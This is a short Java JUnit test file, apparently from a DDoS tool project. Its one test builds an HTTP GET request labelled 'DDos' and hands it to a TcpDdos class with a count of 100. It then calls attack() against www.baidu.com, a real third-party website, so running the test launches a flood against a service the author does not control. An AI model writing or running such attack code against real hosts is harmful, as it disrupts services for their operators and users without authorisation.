package ljs.ddos;

import ljs.ddos.tcp.TcpDdos;
import ljs.ddos.tcp.http.HttpMethod;
import ljs.ddos.tcp.http.HttpRequestBuild;
import org.junit.Test;

import java.net.MalformedURLException;

public class DDosTest {
    @Test
    public void tcpAttackTest() throws MalformedURLException, InterruptedException {
        TcpDdos tcpDdos = new TcpDdos(new HttpRequestBuild()
                .method(HttpMethod.GET)
                .url("http://www.baidu.com")
                .addHead("Connection", "Keep-Alive")
                .addHead("Accept-Encoding", "gzip")
                .addHead("User-Agent", "DDos")
                , 100).attack();
    }
}
